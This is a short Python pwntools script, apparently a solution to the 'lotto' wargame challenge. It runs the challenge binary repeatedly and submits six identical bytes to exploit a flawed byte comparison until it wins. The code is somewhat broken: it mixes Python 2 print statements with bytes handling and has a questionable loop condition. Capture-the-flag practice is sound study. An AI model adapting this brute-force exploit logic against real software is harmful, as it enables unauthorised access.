from pwn import *

p = process('/home/lotto/lotto')
# p = process('./lotto')

l = p.recv().decode('utf-8')
print l

i = 0
while l.find('Exit') and i < 100:
    p.sendline(b'1\n')
    p.recvuntil(b'Submit your 6 lotto bytes :')
    p.sendline(b'######\n')

    l = p.recvuntil('3. Exit').decode('utf-8')
    print 'recv ' + l
    i += 1

